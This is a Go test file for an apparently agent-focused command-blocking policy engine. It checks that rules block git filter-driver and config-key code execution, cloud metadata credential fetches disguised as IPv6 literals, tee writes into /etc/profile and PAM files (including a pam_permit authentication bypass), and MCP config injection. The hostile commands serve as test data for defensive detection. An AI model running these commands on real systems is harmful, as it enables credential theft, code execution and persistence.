package analyzer_test

import (
	"os"
	"strings"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/normalize"
	"github.com/AI-AgentLens/agentshield/internal/ossbuild"
	"github.com/AI-AgentLens/agentshield/internal/policy"
)

// Raised twins (Gary, 2026-11-19). Each row below was AUDIT on main while its
// twin, the same action spelled the way an existing rule reads, BLOCKed. The
// raise reuses the twin's rule wherever one could be widened, so each row
// names the rule that now decides it. The tests run the engine as the hook
// does, because the inline pack rows only match raw text.

// twinWant is what a row asserts.
type twinWant int

const (
	// blocks: the decision is BLOCK and the named rule is among the triggers.
	blocks twinWant = iota
	// notBlocked: the decision is below BLOCK. Used for rows that were not
	// raised (their own twin is AUDIT on main) and for text that only
	// mentions the command.
	notBlocked
)

type twinCase struct {
	name string
	cmd  string
	rule string
	want twinWant
}

// runTwinCases evaluates every case through the full engine.
func runTwinCases(t *testing.T, cases []twinCase) {
	t.Helper()
	engine, err := policy.NewEngineWithAnalyzers(loadTestPolicy(t), 2)
	if err != nil {
		t.Fatal(err)
	}
	cwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			n := normalize.NormalizeCommand(c.cmd, cwd)
			res := engine.EvaluateWithParsedCwd(c.cmd, n.Paths, n.Parsed, cwd)
			named := false
			for _, r := range res.TriggeredRules {
				if r == c.rule {
					named = true
				}
			}
			switch c.want {
			case blocks:
				if res.Decision != policy.DecisionBlock || !named {
					t.Fatalf("want BLOCK by %s, got %s %v", c.rule, res.Decision, res.TriggeredRules)
				}
			case notBlocked:
				if res.Decision == policy.DecisionBlock {
					t.Fatalf("want below BLOCK, got %s %v", res.Decision, res.TriggeredRules)
				}
			}
		})
	}
}

// requireNoAnchorChars fails when a rule's pattern holds ^ or $: either one
// makes the engine treat the rule as position-bound and drop its
// whole-command program-name reading (#4968).
func requireNoAnchorChars(t *testing.T, pol *policy.Policy, id string) {
	t.Helper()
	for i := range pol.Rules {
		if pol.Rules[i].ID != id {
			continue
		}
		if p := pol.Rules[i].Match.CommandRegex; strings.ContainsAny(p, "^$") {
			t.Errorf("the pattern of %s contains ^ or $; write the start of text as \\A and classes as positive sets:\n%s", id, p)
		}
		return
	}
	t.Fatalf("rule %s not found in the loaded packs", id)
}

// TestRaisedTwins_GitEmptyDriverName — #4975. A git filter driver with an
// empty name (filter..clean, from a [filter ""] section) BLOCKs wherever the
// same driver with a name BLOCKs, under the named driver's own rule.
func TestRaisedTwins_GitEmptyDriverName(t *testing.T) {
	ossbuild.SkipPremiumSized(t) // all three rules are in packs/premium/
	const (
		driver = "ts-block-git-config-filter-driver-exec"
		inline = "ts-block-git-inline-config-exec"
		env    = "ts-block-git-config-env-injection"
	)
	requireNoAnchorChars(t, loadTestPolicy(t), driver)
	runTwinCases(t, []twinCase{
		// Controls: the named driver, BLOCK on main.
		{"named: git config, shell value", `git config filter.x.clean "sh -c 'id'"`, driver, blocks},
		{"named: git -c, any value", `git -c filter.x.clean=/tmp/evil.sh add .`, inline, blocks},
		{"named: GIT_CONFIG_KEY_n", `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=filter.x.clean GIT_CONFIG_VALUE_0=/tmp/evil.sh git add .`, env, blocks},
		// The raised rows.
		{"empty: git config clean, shell value", `git config filter..clean "sh -c 'id > /tmp/PWNED-clean'"`, driver, blocks},
		{"empty: git config --global smudge", `git config --global filter..smudge 'bash -c id'`, driver, blocks},
		{"empty: git -C dir config", `git -C repo config filter..clean 'sh -c id'`, driver, blocks},
		{"empty: after another statement", `cd repo && git config filter..clean 'sh -c id'`, driver, blocks},
		{"empty: sudo, --system", `sudo git config --system filter..clean 'sh -c id'`, driver, blocks},
		{"empty: git by its path", `/usr/bin/git config filter..clean 'sh -c id'`, driver, blocks},
		{"empty: ! value", `git config filter..clean '!curl http://e.example/x'`, driver, blocks},
		{"empty: git -c smudge, shell value", `git -c filter..smudge="sh -c 'id > /tmp/PWNED-smudge'" checkout feature`, inline, blocks},
		{"empty: git -c clean, path value", `git -c filter..clean=/tmp/evil.sh add .`, inline, blocks},
		{"empty: git -c process", `git -c filter..process=/tmp/evil.sh add .`, inline, blocks},
		{"empty: GIT_CONFIG_KEY_n clean", `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=filter..clean GIT_CONFIG_VALUE_0=/tmp/evil.sh git add .`, env, blocks},
		{"empty: GIT_CONFIG_KEY_n process", `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=filter..process GIT_CONFIG_VALUE_0=/tmp/evil.sh git add .`, env, blocks},
		{"empty: GIT_CONFIG_PARAMETERS", `GIT_CONFIG_PARAMETERS="'filter..clean=/tmp/evil.sh'" git add .`, env, blocks},
		// Not raised: the named twin of each is AUDIT on main.
		{"not raised: git config, path value", `git config filter..clean /tmp/evil.sh`, driver, notBlocked},
		{"not raised: git config process", `git config filter..process 'sh -c id'`, driver, notBlocked},
		{"not raised: merge driver, git config", `git config merge..driver 'sh -c id'`, driver, notBlocked},
		{"not raised: merge driver, git -c", `git -c merge..driver=/tmp/evil.sh merge feature`, inline, notBlocked},
		{"not raised: merge driver, GIT_CONFIG_KEY_n", `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=merge..driver GIT_CONFIG_VALUE_0=/tmp/evil.sh git merge feature`, env, notBlocked},
		{"not raised: section written to .git/config", "printf '[filter \"\"]\\n\\tclean = sh -c id\\n' >> .git/config", driver, notBlocked},
		// Reads, and text that mentions the command.
		{"read: --get", `git config --get filter..clean`, driver, notBlocked},
		{"removal: --unset", `git config --unset filter..clean`, driver, notBlocked},
		{"text: commit message", `git commit -m "docs: git config filter..clean 'sh -c id' is the empty-name driver"`, driver, notBlocked},
		{"text: echo", `echo "git config filter..clean 'sh -c id'"`, driver, notBlocked},
		{"text: gh body", `gh issue comment 1 --body "git config filter..clean 'sh -c id'"`, driver, notBlocked},
		{"text: heredoc body", "cat > notes.md <<'EOF'\ngit config filter..clean 'sh -c id'\nEOF", driver, notBlocked},
	})
}

// TestRaisedTwins_MetadataIPv6Embedded — #4976. A cloud metadata IPv4
// wrapped in a NAT64 or IPv4-mapped IPv6 literal BLOCKs, as the plain IPv4
// form already does under the IMDS rules. A wrapped public address does not.
func TestRaisedTwins_MetadataIPv6Embedded(t *testing.T) {
	ossbuild.SkipPremiumSized(t) // the rule is in packs/premium/
	const (
		wrapped = "ne-block-imds-ipv6-embedded-ipv4"
		aws     = "sec-block-aws-imds"
		other   = "ne-block-imds-aws-other-addresses"
		alicn   = "ne-block-imds-alibaba-tencent-other-addresses"
	)
	runTwinCases(t, []twinCase{
		// Controls: the plain IPv4 twins, BLOCK on main.
		{"plain: AWS IMDS", `curl -s http://169.254.169.254/latest/meta-data/`, aws, blocks},
		{"plain: ECS credentials", `curl -s http://169.254.170.2/v2/credentials/`, other, blocks},
		{"plain: Alibaba", `curl -s http://100.100.100.200/latest/meta-data/`, alicn, blocks},
		// The raised rows.
		{"NAT64 hex: AWS IMDS", `curl -s -g "http://[64:ff9b::a9fe:a9fe]/latest/meta-data/iam/security-credentials/"`, wrapped, blocks},
		{"NAT64 dotted: AWS IMDS", `curl -s -g http://[64:ff9b::169.254.169.254]/latest/meta-data/`, wrapped, blocks},
		{"mapped dotted: AWS IMDS", `curl -s -g http://[::ffff:169.254.169.254]/latest/meta-data/`, wrapped, blocks},
		{"mapped hex: AWS IMDS", `curl -s -g http://[::ffff:a9fe:a9fe]/latest/meta-data/`, wrapped, blocks},
		{"NAT64: ECS credentials", `curl -s -g http://[64:ff9b::a9fe:aa02]/v2/credentials/`, wrapped, blocks},
		{"mapped hex: EKS Pod Identity", `curl -s -g http://[::ffff:a9fe:aa17]/v1/credentials`, wrapped, blocks},
		{"NAT64: Tencent", `curl -s -g http://[64:ff9b::a9fe:17]/latest/meta-data/`, wrapped, blocks},
		{"NAT64: Alibaba, wget", `wget -qO- http://[64:ff9b::6464:64c8]/latest/meta-data/`, wrapped, blocks},
		{"mapped dotted: Alibaba", `curl -s -g http://[::ffff:100.100.100.200]/latest/meta-data/`, wrapped, blocks},
		{"with a port", `curl -s -g http://[64:ff9b::a9fe:a9fe]:80/latest/meta-data/`, wrapped, blocks},
		{"upper case", `curl -s -g http://[::FFFF:A9FE:A9FE]/latest/meta-data/`, wrapped, blocks},
		{"from python", `python3 -c "import urllib.request as u; print(u.urlopen('http://[64:ff9b::a9fe:a9fe]/latest/meta-data/').read())"`, wrapped, blocks},
		// A wrapped address that is not a metadata service.
		{"NAT64: public DNS", `curl -s -g http://[64:ff9b::808:808]/`, wrapped, notBlocked},
		{"mapped dotted: public DNS", `curl -s -g http://[::ffff:8.8.8.8]/`, wrapped, notBlocked},
		{"NAT64 dotted: public DNS", `curl -s -g http://[64:ff9b::1.1.1.1]/`, wrapped, notBlocked},
		{"mapped hex: public DNS", `curl -s -g http://[::ffff:101:101]/`, wrapped, notBlocked},
		{"next to the IMDS address", `curl -s -g http://[64:ff9b::a9fe:a9ff]/`, wrapped, notBlocked},
		// Text that mentions the address.
		{"text: echo", `echo "curl http://[64:ff9b::a9fe:a9fe]/latest/meta-data/ wraps the IMDS address"`, wrapped, notBlocked},
		{"text: commit message", `git commit -m "docs: http://[::ffff:169.254.169.254]/ is the mapped IMDS address"`, wrapped, notBlocked},
		{"text: gh body", `gh issue comment 1 --body "curl http://[64:ff9b::a9fe:a9fe]/latest/meta-data/"`, wrapped, notBlocked},
	})
}

// TestRaisedTwins_GitProgramKeys — #4974. gc.recentObjectsHook and
// core.alternateRefsCommand BLOCK in each spelling where core.sshCommand
// BLOCKs on main, and stay as they were where it does not.
func TestRaisedTwins_GitProgramKeys(t *testing.T) {
	ossbuild.SkipPremiumSized(t) // all three rules are in packs/premium/
	const (
		twin     = "ts-block-git-config-sshcommand"
		twinIn   = "ts-block-git-inline-sshcommand"
		config   = "ts-block-git-config-program-key"
		inline   = "ts-block-git-inline-config-exec"
		env      = "ts-block-git-config-env-injection"
		recent   = "gc.recent" + "ObjectsHook"
		altRefs  = "core.alternate" + "RefsCommand"
		program  = " /tmp/x.sh"
		shellVal = ` "sh -c 'id'"`
	)
	// ts-block-git-config-program-key is position-bound on purpose (a real ^):
	// that is what makes the engine retry it on text a command executes. The
	// two "executed text" rows below fail when it is spelled with \A.
	runTwinCases(t, []twinCase{
		// Controls: core.sshCommand, BLOCK on main.
		{"twin: git config", "git config core.sshCommand" + program, twin, blocks},
		{"twin: git -c", "git -c core.sshCommand=/tmp/x.sh fetch", twinIn, blocks},
		{"twin: GIT_CONFIG_KEY_n", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0=/tmp/x.sh git fetch", env, blocks},
		// git config, each spelling the twin BLOCKs.
		{"config: recent, shell value", "git config " + recent + shellVal, config, blocks},
		{"config: altrefs, shell value", "git config " + altRefs + shellVal, config, blocks},
		{"config: --global", "git config --global " + recent + program, config, blocks},
		{"config: --system", "git config --system " + altRefs + program, config, blocks},
		{"config: --local", "git config --local " + recent + program, config, blocks},
		{"config: --worktree", "git config --worktree " + altRefs + program, config, blocks},
		{"config: -C dir", "git -C repo config " + recent + program, config, blocks},
		{"config: --git-dir=", "git --git-dir=repo/.git config " + altRefs + program, config, blocks},
		{"config: --file", "git config --file .git/config " + recent + program, config, blocks},
		{"config: -f", "git config -f .git/config " + altRefs + program, config, blocks},
		{"config: --add", "git config --add " + recent + program, config, blocks},
		{"config: --replace-all", "git config --replace-all " + altRefs + program, config, blocks},
		{"config: --type=path", "git config --type=path " + recent + program, config, blocks},
		{"config: set subcommand", "git config set " + altRefs + program, config, blocks},
		{"config: after cd", "cd repo && git config " + recent + program, config, blocks},
		{"config: sudo", "sudo git config --system " + altRefs + program, config, blocks},
		{"config: git by its path", "/usr/bin/git config " + recent + program, config, blocks},
		{"executed text: piped into bash", "echo 'git config --global " + recent + program + " ' | bash", config, blocks},
		{"executed text: command substitution", `echo "$(git config ` + altRefs + program + ` )"`, config, blocks},
		// git -c and GIT_CONFIG_KEY_n.
		{"inline: recent", "git -c " + recent + "=/tmp/x.sh gc", inline, blocks},
		{"inline: altrefs, shell value", "git -c " + altRefs + "='sh -c id' fetch", inline, blocks},
		{"env: recent", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=" + recent + " GIT_CONFIG_VALUE_0=/tmp/x.sh git gc", env, blocks},
		{"env: altrefs (already on main)", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=" + altRefs + " GIT_CONFIG_VALUE_0=/tmp/x.sh git fetch", env, blocks},
		{"env: GIT_CONFIG_PARAMETERS", `GIT_CONFIG_PARAMETERS="'` + recent + `=/tmp/x.sh'" git gc`, env, blocks},
		// Not raised: the twin is AUDIT on main for a write into .git/config.
		{"file write: printf", "printf '[gc]\\n\\trecentObjectsHook = /tmp/x.sh\\n' >> .git/config", config, notBlocked},
		{"file write: tee", "echo 'alternateRefsCommand = /tmp/x.sh' | tee -a .git/config", config, notBlocked},
		// The other keys of the AUDIT rule stay AUDIT.
		{"other key: uploadpack", "git config remote.origin.uploadpack" + program, config, notBlocked},
		{"other key: include.path", "git config include.path ../evil.cfg", config, notBlocked},
		// Reads and removals.
		{"read: --get", "git config --get " + recent, config, notBlocked},
		{"read: --get, redirect", "git config --get " + recent + " 2>&1", config, notBlocked},
		{"read: --get with a value pattern", "git config --get " + recent + " sh", config, notBlocked},
		{"read: no value", "git config " + altRefs, config, notBlocked},
		{"read: --get-all", "git config --get-all " + altRefs, config, notBlocked},
		{"read: --list", "git config --list", config, notBlocked},
		{"removal: --unset", "git config --unset " + recent, config, notBlocked},
		{"removal: --unset-all with a pattern", "git config --unset-all " + altRefs + " sh", config, notBlocked},
		// Text that mentions the command.
		{"text: echo", `echo "git config ` + recent + program + `"`, config, notBlocked},
		{"text: commit message", `git commit -m "docs: git config ` + recent + program + ` runs a program"`, config, notBlocked},
		{"text: gh body", `gh issue comment 1 --body "git config ` + altRefs + program + `"`, config, notBlocked},
		{"text: heredoc body", "cat > notes.md <<'EOF'\ngit config " + recent + program + "\nEOF", config, notBlocked},
		{"text: comment", "# git config " + recent + program, config, notBlocked},
	})
}

// TestRaisedTwins_TeeSystemFiles — #4966, the sweep's community rows. tee
// into a system-wide shell startup file or a PAM file BLOCKs under the rule
// that already BLOCKs the redirect into the same file. Both rules are in
// packs/community/, so this runs in the OSS build too.
func TestRaisedTwins_TeeSystemFiles(t *testing.T) {
	const (
		profile = "ts-block-shell-sysprofile-write"
		pam     = "ts-block-pam-config-write"
	)
	// ts-block-shell-sysprofile-write held a ^ (inside [^\s]) before #4966,
	// so it was already position-bound; only the PAM rule is checked here.
	requireNoAnchorChars(t, loadTestPolicy(t), pam)
	runTwinCases(t, []twinCase{
		// Controls: the redirect into the same file, BLOCK on main.
		{"profile: redirect", `echo 'export X=1' >> /etc/profile`, profile, blocks},
		{"pam: redirect", `echo 'auth sufficient pam_permit.so' > /etc/pam.d/sshd`, pam, blocks},
		{"pam: pipe into tee", `echo 'auth sufficient pam_permit.so' | sudo tee /etc/pam.d/sshd`, pam, blocks},
		// Shell startup files: both tee forms.
		{"profile: pipe into tee", `echo 'export X=1' | sudo tee -a /etc/profile`, profile, blocks},
		{"profile: here-string", `sudo tee -a /etc/profile <<< 'export X=1'`, profile, blocks},
		{"profile: heredoc", "sudo tee -a /etc/profile <<'EOF'\nexport X=1\nEOF", profile, blocks},
		{"profile.d: pipe into tee", `echo 'export X=1' | sudo tee /etc/profile.d/x.sh`, profile, blocks},
		{"profile.d: here-string", `sudo tee /etc/profile.d/x.sh <<< 'export X=1'`, profile, blocks},
		{"profile.d: heredoc", "sudo tee /etc/profile.d/x.sh <<'EOF'\nexport X=1\nEOF", profile, blocks},
		{"environment: pipe into tee", `echo 'X=1' | sudo tee -a /etc/environment`, profile, blocks},
		{"environment: here-string", `sudo tee -a /etc/environment <<< 'X=1'`, profile, blocks},
		{"environment: heredoc", "sudo tee -a /etc/environment <<'EOF'\nX=1\nEOF", profile, blocks},
		{"bash.bashrc: pipe into tee", `echo 'export X=1' | sudo tee -a /etc/bash.bashrc`, profile, blocks},
		{"bash.bashrc: here-string", `sudo tee -a /etc/bash.bashrc <<< 'export X=1'`, profile, blocks},
		{"bash.bashrc: heredoc", "sudo tee -a /etc/bash.bashrc <<'EOF'\nexport X=1\nEOF", profile, blocks},
		{"profile: after cd, tee by its path", `cd /tmp && sudo -n /usr/bin/tee -a /etc/environment < line`, profile, blocks},
		// PAM: the here-string and heredoc forms.
		{"pam: here-string", `sudo tee /etc/pam.d/sshd <<< 'auth sufficient pam_permit.so'`, pam, blocks},
		{"pam: heredoc", "sudo tee /etc/pam.d/sshd <<'EOF'\nauth sufficient pam_permit.so\nEOF", pam, blocks},
		{"pam: fed by a file", `sudo tee -a /etc/pam.d/common-auth < /tmp/pam`, pam, blocks},
		// Not writes to those files.
		{"profile: a read into tee", `cat /etc/profile | tee /tmp/copy`, profile, notBlocked},
		{"profile: a backup of it", `sudo tee /tmp/profile.bak < /etc/profile`, profile, notBlocked},
		{"profile: path in a here-string", `tee /tmp/notes.txt <<< "edit /etc/profile.d/x.sh"`, profile, notBlocked},
		{"profile: prose", `echo "run sudo tee -a /etc/environment and paste the line"`, profile, notBlocked},
		{"profile: another file", `tee /etc/profile.bak <<< data`, profile, notBlocked},
		{"pam: a read into tee", `cat /etc/pam.d/sshd | tee /tmp/pam.copy`, pam, notBlocked},
		{"pam: path in a here-string", `tee /tmp/notes.txt <<< "/etc/pam.d/sshd"`, pam, notBlocked},
		{"pam: commit message", `git commit -m "docs: sudo tee /etc/pam.d/sshd was the old way"`, pam, notBlocked},
	})
}

// TestRaisedTwins_TeeMCPConfig — #4966, the sweep's MCP config rows. tee
// into ~/.cursor/mcp.json or a .mcp.json, fed by a here-string, a heredoc or
// a file, BLOCKs under the rule that already BLOCKs the redirect and the
// pipe into tee.
func TestRaisedTwins_TeeMCPConfig(t *testing.T) {
	ossbuild.SkipPremiumSized(t) // sc-block-mcp-config-injection is in packs/premium/
	const mcp = "sc-block-mcp-config-injection"
	requireNoAnchorChars(t, loadTestPolicy(t), mcp)
	const body = `'{"mcpServers":{}}'`
	runTwinCases(t, []twinCase{
		// Controls: BLOCK on main.
		{"cursor: redirect", `echo ` + body + ` > ~/.cursor/mcp.json`, mcp, blocks},
		{"project: pipe into tee", `echo ` + body + ` | tee .mcp.json`, mcp, blocks},
		// The raised rows.
		{"cursor: here-string", `tee ~/.cursor/mcp.json <<< ` + body, mcp, blocks},
		{"cursor: heredoc", "tee ~/.cursor/mcp.json <<'EOF'\n{\"mcpServers\":{}}\nEOF", mcp, blocks},
		{"cursor: fed by a file", `tee ~/.cursor/mcp.json < /tmp/mcp.json`, mcp, blocks},
		{"cursor: sudo, $HOME", `sudo tee -a "$HOME/.cursor/mcp.json" <<< data`, mcp, blocks},
		{"project: here-string", `tee .mcp.json <<< ` + body, mcp, blocks},
		{"project: heredoc", "tee .mcp.json <<'EOF'\n{\"mcpServers\":{}}\nEOF", mcp, blocks},
		{"project: in a subdirectory", "tee proj/.mcp.json <<'EOF'\n{\"mcpServers\":{}}\nEOF", mcp, blocks},
		// Not writes to either file.
		{"cursor: a backup of it", `tee ~/.cursor/mcp.json.bak < ~/.cursor/mcp.json`, mcp, notBlocked},
		{"project: another name", `tee mcp.json <<< '{}'`, mcp, notBlocked},
		{"project: an example file", `tee .mcp.json.example <<< '{}'`, mcp, notBlocked},
		{"project: path in a here-string", `tee /tmp/notes.txt <<< "add it to .mcp.json"`, mcp, notBlocked},
		{"project: prose", `echo "run tee .mcp.json to write it"`, mcp, notBlocked},
	})
}
